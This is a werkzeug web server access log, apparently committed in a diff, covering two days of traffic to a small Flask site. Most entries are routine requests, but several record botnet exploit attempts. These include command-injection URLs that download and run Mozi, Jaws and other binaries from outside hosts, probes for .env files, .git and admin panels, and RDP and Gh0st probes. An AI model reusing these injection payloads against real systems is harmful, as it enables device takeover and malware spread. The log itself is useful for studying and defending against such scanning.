+INFO:werkzeug:198.20.101.106 - - [24/Apr/2023 16:05:06] "[35m[1m î  êô,`º #jEC-ðàÙHèÖI÷À{ì$õ *#*nOÌ.4<ú!`:1ÌëÉõ¾õÜVç &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:79.124.59.170 - - [24/Apr/2023 16:11:58] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:179.43.177.243 - - [24/Apr/2023 16:25:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:178.32.197.88 - - [24/Apr/2023 17:07:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:188.165.87.108 - - [24/Apr/2023 17:18:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 17:38:04] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.63 - - [24/Apr/2023 17:49:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [24/Apr/2023 17:49:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [24/Apr/2023 17:49:16] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:154.209.125.92 - - [24/Apr/2023 17:49:16] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+ERROR:werkzeug:104.196.241.230 - - [24/Apr/2023 18:36:05] code 400, message Bad request version ('vÅV_/6\x98\x82\x8cK!É')
+INFO:werkzeug:104.196.241.230 - - [24/Apr/2023 18:36:05] "[35m[1m M  Iµ¦Áz¥^àó%<Á!ªÂ&½ó ¡Qh ¡~ vÅV_/6K!É[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:104.196.241.230 - - [24/Apr/2023 18:36:08] "OPTIONS / HTTP/1.0" 200 -
+INFO:werkzeug:123.132.165.170 - - [24/Apr/2023 18:40:50] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.132.165.170:60842/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+INFO:werkzeug:179.43.177.243 - - [24/Apr/2023 19:27:44] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:159.223.136.180 - - [24/Apr/2023 20:08:19] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:66.240.205.34 - - [24/Apr/2023 20:10:38] code 400, message Bad request version ('®¯]')
+INFO:werkzeug:66.240.205.34 - - [24/Apr/2023 20:10:38] "[35m[1mGh0st­   à   xKS``ÃÀÀÀÄ@¼Q	H§e&§*$&g+2ö°00¬¨rc  \`&ÇK7ån9n;3¬èsch¨^Ï4'J©ã0Ãh]&øÎSËA4L?2=áÄ@õ`T®¯][0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:188.165.87.98 - - [24/Apr/2023 20:15:02] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:113.142.141.105 - - [24/Apr/2023 20:23:48] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:139.99.9.160 - - [24/Apr/2023 20:32:52] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:61.0.56.110 - - [24/Apr/2023 20:48:12] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:163.123.142.174 - - [24/Apr/2023 21:01:59] "[33mGET /.git/HEAD HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 21:22:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 21:43:43] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.251 - - [24/Apr/2023 22:16:46] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.118.39.82 - - [24/Apr/2023 23:19:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:85.217.144.136 - - [24/Apr/2023 23:34:57] "[33mCONNECT 84.153.66.204:4444 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:205.210.31.220 - - [24/Apr/2023 23:54:03] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:205.210.31.220 - - [24/Apr/2023 23:54:03] "[35m[1m Ê  ÆB éQNhÂ/bëÂZ´6mG8IüÔtÏj¥ö±  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:185.180.143.79 - - [25/Apr/2023 00:12:30] "[33mGET /sugar_version.json HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.233.19.16 - - [25/Apr/2023 00:30:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 00:35:27] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.47.61.24 - - [25/Apr/2023 00:48:00] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.47.61.24 - - [25/Apr/2023 00:48:00] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:152.231.50.76 - - [25/Apr/2023 00:48:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.206 - - [25/Apr/2023 00:51:18] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:179.43.163.111 - - [25/Apr/2023 01:04:09] "[33mGET /phpmyadmin/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:59.36.163.204 - - [25/Apr/2023 01:23:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:46.101.73.109 - - [25/Apr/2023 01:25:32] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:46.101.73.109 - - [25/Apr/2023 01:25:32] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.101.73.109 - - [25/Apr/2023 01:25:32] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.101.73.109 - - [25/Apr/2023 01:25:33] "[33mGET /wordpress/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.101.73.109 - - [25/Apr/2023 01:25:33] "[33mGET /blog/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:46.101.73.109 - - [25/Apr/2023 01:25:33] "[33mGET /wp/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.35.18.251 - - [25/Apr/2023 01:48:28] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:141.98.11.41 - - [25/Apr/2023 01:58:49] "[33mCONNECT ipchicken.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.216 - - [25/Apr/2023 02:19:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 02:58:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:78.139.44.237 - - [25/Apr/2023 03:13:14] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:99.239.78.117 - - [25/Apr/2023 03:38:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:85.217.144.136 - - [25/Apr/2023 03:50:58] "[33mCONNECT 84.153.66.204:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.170.223.194 - - [25/Apr/2023 04:00:04] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:178.210.75.193 - - [25/Apr/2023 04:00:27] "[33mGET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723*20;&supfiles=on.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.114 - - [25/Apr/2023 04:29:24] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:198.235.24.103 - - [25/Apr/2023 04:34:31] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:37.221.92.199 - - [25/Apr/2023 04:50:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 05:28:05] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:172.104.11.4 - - [25/Apr/2023 05:58:18] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 06:29:25] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:66.240.236.116 - - [25/Apr/2023 06:38:22] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:159.203.44.105 - - [25/Apr/2023 06:53:57] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:159.203.44.105 - - [25/Apr/2023 06:54:06] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:159.203.44.105 - - [25/Apr/2023 06:54:18] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:87.236.176.219 - - [25/Apr/2023 06:54:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.55.0.5 - - [25/Apr/2023 06:56:13] "[33mGET /ReportServer HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.235.15 - - [25/Apr/2023 06:58:51] "[33mGET /druid/index.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.20.69 - - [25/Apr/2023 06:59:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:65.49.20.69 - - [25/Apr/2023 07:01:56] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.20.69 - - [25/Apr/2023 07:03:04] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 07:35:12] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:92.118.39.82 - - [25/Apr/2023 07:48:31] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:85.217.144.136 - - [25/Apr/2023 07:59:10] "[33mCONNECT 84.153.66.204:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.227.146.243 - - [25/Apr/2023 08:16:25] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.227.146.243 - - [25/Apr/2023 08:16:35] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.227.146.243 - - [25/Apr/2023 08:16:55] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:138.68.42.106 - - [25/Apr/2023 08:59:33] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:58.187.9.230 - - [25/Apr/2023 09:06:12] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:179.43.177.243 - - [25/Apr/2023 09:11:40] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:161.35.233.14 - - [25/Apr/2023 09:15:28] "[33mGET /explore HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.180.143.189 - - [25/Apr/2023 09:29:51] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:123.57.217.59 - - [25/Apr/2023 09:39:24] "[33mGET /shell?cd+/tmp;+wget+http:/\/5.182.210.60/jack5tr.sh;+chmod+777+jack5tr.sh;+sh+jack5tr.sh;rm+-rf+home.arm HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.199.115.80 - - [25/Apr/2023 10:09:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:128.14.133.58 - - [25/Apr/2023 10:14:51] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:192.155.80.112 - - [25/Apr/2023 10:46:36] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.155.80.112 - - [25/Apr/2023 10:46:37] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:197.251.201.194 - - [25/Apr/2023 10:54:59] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:85.208.136.77 - - [25/Apr/2023 11:00:12] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:85.208.136.77 - - [25/Apr/2023 11:00:12] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 11:07:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.251 - - [25/Apr/2023 11:59:06] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:85.217.144.136 - - [25/Apr/2023 12:07:03] "[33mCONNECT 84.153.66.204:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:124.156.223.97 - - [25/Apr/2023 12:10:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:198.235.24.23 - - [25/Apr/2023 12:11:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:124.89.86.149 - - [25/Apr/2023 12:40:21] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:181.162.125.110 - - [25/Apr/2023 13:04:26] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 13:14:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:190.2.72.141 - - [25/Apr/2023 13:22:41] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:94.124.76.39 - - [25/Apr/2023 13:48:45] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:34.22.147.120 - - [25/Apr/2023 14:01:48] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:35.216.229.26 - - [25/Apr/2023 14:40:46] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 14:59:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:161.35.233.14 - - [25/Apr/2023 15:01:19] "[33mGET /explore HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.44 - - [25/Apr/2023 15:04:38] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.44 - - [25/Apr/2023 15:04:43] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.44 - - [25/Apr/2023 15:04:55] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.44 - - [25/Apr/2023 15:05:00] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 15:51:43] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.52 - - [25/Apr/2023 15:59:42] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.248.133.52 - - [25/Apr/2023 15:59:42] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.248.133.52 - - [25/Apr/2023 15:59:42] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.248.133.52 - - [25/Apr/2023 15:59:42] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:werkzeug:172.104.11.34 - - [25/Apr/2023 16:26:19] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:172.104.11.34 - - [25/Apr/2023 16:26:19] "[35m[1m   _fUÒãú¶H-|vÖ7¦áÇµ(³_É®°Esçª   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:172.104.210.105 - - [25/Apr/2023 16:31:42] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:152.32.191.185 - - [25/Apr/2023 16:39:33] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:162.243.146.16 - - [25/Apr/2023 16:56:47] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:162.243.146.16 - - [25/Apr/2023 16:56:47] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:198.235.24.58 - - [25/Apr/2023 17:40:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 17:41:08] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:195.178.120.37 - - [25/Apr/2023 18:20:26] code 400, message Bad request syntax ('{D79E94C5-70F0-46BD-965B-E17497CCB598}')
+INFO:werkzeug:195.178.120.37 - - [25/Apr/2023 18:20:26] "[35m[1m{D79E94C5-70F0-46BD-965B-E17497CCB598}[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.118.53.210 - - [25/Apr/2023 19:22:52] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:107.189.10.254 - - [25/Apr/2023 19:34:14] "[33mPOST /wp-comments-post.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 19:38:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:192.241.207.91 - - [25/Apr/2023 19:43:35] "[33mGET /manager/text/list HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.209.125 - - [25/Apr/2023 20:14:01] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+ERROR:werkzeug:45.227.254.8 - - [25/Apr/2023 20:42:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:45.227.254.8 - - [25/Apr/2023 20:42:18] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:66.150.198.134 - - [25/Apr/2023 20:51:49] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:66.150.198.134 - - [25/Apr/2023 20:51:49] "[33mPOST /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:85.217.144.136 - - [25/Apr/2023 22:17:00] "[33mCONNECT 84.153.78.7:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:209.38.252.58 - - [25/Apr/2023 22:33:42] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.189.182.234 - - [25/Apr/2023 22:48:42] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:185.170.144.3 - - [25/Apr/2023 23:00:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:185.170.144.3 - - [25/Apr/2023 23:00:36] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 23:29:31] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.50 - - [25/Apr/2023 23:43:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.50 - - [25/Apr/2023 23:43:29] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.248.133.50 - - [25/Apr/2023 23:43:29] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.248.133.50 - - [25/Apr/2023 23:43:29] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.248.133.50 - - [25/Apr/2023 23:43:30] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:205.210.31.169 - - [25/Apr/2023 23:47:34] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:85.217.144.136 - - [25/Apr/2023 23:49:22] "[33mCONNECT 84.153.78.7:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [25/Apr/2023 23:54:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:37.221.92.199 - - [26/Apr/2023 00:45:20] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:109.237.98.226 - - [26/Apr/2023 01:47:56] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.237.98.226 - - [26/Apr/2023 01:47:56] code 400, message Bad request version ('¯\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+INFO:werkzeug:109.237.98.226 - - [26/Apr/2023 01:47:56] "[35m[1mH D]òRªÖí¨D^\§daI0ü(¥QaVÓcq3 ÜÚÈ?¬~¤£qÍº¾ÉR½¯QH	ÆN¯ bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 02:18:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:91.217.58.9 - - [26/Apr/2023 02:25:59] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:85.217.144.136 - - [26/Apr/2023 03:27:23] "[33mCONNECT 84.153.78.7:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 04:30:31] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:1.192.188.213 - - [26/Apr/2023 05:12:28] "[33mGET /phpmyadmin/index.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:1.192.188.213 - - [26/Apr/2023 05:12:50] "[33mGET /pmd/index.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:44.211.97.188 - - [26/Apr/2023 05:32:39] code 400, message Bad request version ('À\x94')
+INFO:werkzeug:44.211.97.188 - - [26/Apr/2023 05:32:39] "[35m[1m ê  ækGg¿iJFxïó"bA¿¢,g;TµÌ³Ì0 ê¨ãEõCRÝfÞÏ×ÙJD¥+SæêÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:44.211.97.188 - - [26/Apr/2023 05:32:39] "[33mGET /99vt HTTP/1.1[0m" 404 -
+INFO:werkzeug:44.211.97.188 - - [26/Apr/2023 05:32:39] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:44.211.97.188 - - [26/Apr/2023 05:32:39] "[33mGET /99vu HTTP/1.1[0m" 404 -
+INFO:werkzeug:114.142.8.159 - - [26/Apr/2023 05:42:50] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.35.18.251 - - [26/Apr/2023 05:46:33] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.118.39.82 - - [26/Apr/2023 06:26:44] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 06:34:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:87.236.176.253 - - [26/Apr/2023 06:51:09] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:85.217.144.136 - - [26/Apr/2023 07:05:34] "[33mCONNECT 84.153.78.7:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:79.124.59.170 - - [26/Apr/2023 07:19:43] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:5.202.40.227 - - [26/Apr/2023 08:03:05] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 08:19:26] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.235.24.165 - - [26/Apr/2023 09:03:56] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:198.235.24.165 - - [26/Apr/2023 09:03:56] "[35m[1m Ê  Æâ ¾ªÐ½ÍwZ©y1ÛÞQçß£ô¤  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:179.43.177.243 - - [26/Apr/2023 09:11:32] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:74.82.47.4 - - [26/Apr/2023 09:19:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:74.82.47.4 - - [26/Apr/2023 09:21:16] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:74.82.47.4 - - [26/Apr/2023 09:22:18] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+ERROR:werkzeug:66.240.205.34 - - [26/Apr/2023 09:26:56] code 400, message Bad request version ('ô')
+INFO:werkzeug:66.240.205.34 - - [26/Apr/2023 09:26:56] "[35m[1mH   tj¨#D+Êð§»lÅ×¶íJnÁùxu[lðE-jìÔxLÉrÉuà%Rtgfv]%ÌèÏ® µÀfÈDÅ	ô[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 09:43:03] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:101.68.211.2 - - [26/Apr/2023 10:03:14] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:101.68.211.2 - - [26/Apr/2023 10:03:56] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:101.68.211.2 - - [26/Apr/2023 10:03:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:101.68.211.2 - - [26/Apr/2023 10:03:57] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:196.203.208.202 - - [26/Apr/2023 10:08:44] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:196.203.208.202 - - [26/Apr/2023 10:08:44] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.201.126 - - [26/Apr/2023 10:14:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:139.59.31.218 - - [26/Apr/2023 10:15:40] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:139.59.31.218 - - [26/Apr/2023 10:15:40] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:139.59.31.218 - - [26/Apr/2023 10:15:41] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:139.59.31.218 - - [26/Apr/2023 10:15:41] "[33mGET /wordpress/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:139.59.31.218 - - [26/Apr/2023 10:15:41] "[33mGET /blog/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:139.59.31.218 - - [26/Apr/2023 10:15:42] "[33mGET /wp/wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.118.39.82 - - [26/Apr/2023 10:49:56] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.102.21.123 - - [26/Apr/2023 11:07:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:109.237.97.180 - - [26/Apr/2023 11:16:43] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.237.97.180 - - [26/Apr/2023 11:16:43] code 400, message Bad request version ('\x18ª\x98íê\x896ïJÚ\x99:»')
+INFO:werkzeug:109.237.97.180 - - [26/Apr/2023 11:16:43] "[35m[1mH D%*v·¥´PÜ±né7É-r4ðkKÂ (Ù5@jÞ´ ªíê6ïJÚ:»[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:85.217.144.136 - - [26/Apr/2023 11:32:16] "[33mCONNECT 84.153.78.7:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:179.43.177.243 - - [26/Apr/2023 12:11:53] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 12:46:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:159.203.105.42 - - [26/Apr/2023 12:51:46] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:36.66.59.233 - - [26/Apr/2023 13:13:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:159.203.105.42 - - [26/Apr/2023 13:16:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:159.203.105.42 - - [26/Apr/2023 13:16:54] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:130.211.82.238 - - [26/Apr/2023 13:40:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.56.29.146 - - [26/Apr/2023 13:43:17] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.56.29.146 - - [26/Apr/2023 13:43:18] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:45.88.66.237 - - [26/Apr/2023 13:57:18] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 14:26:08] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:39.108.138.206 - - [26/Apr/2023 14:34:27] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1')
+INFO:werkzeug:39.108.138.206 - - [26/Apr/2023 14:34:27] "[35m[1mGET /shell?cd+/tmp;+wget+http:/\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:152.32.253.58 - - [26/Apr/2023 14:43:01] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:152.32.253.58 - - [26/Apr/2023 14:43:02] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:152.32.253.58 - - [26/Apr/2023 14:43:02] "[35m[1m î  êËÒ9³[C Á°|ÕO­uÈY*ü®Ã½²Þpé Ú²D»N U¢Óyu]Í®¿L1Hº&/¾o &À+À/À,À0Ì©Ì¨À	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:165.154.134.205 - - [26/Apr/2023 14:52:38] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:165.154.134.205 - - [26/Apr/2023 14:52:39] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.154.134.205 - - [26/Apr/2023 14:52:39] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:165.154.134.205 - - [26/Apr/2023 14:52:39] "GET /static/js/main.js HTTP/1.1" 200 -
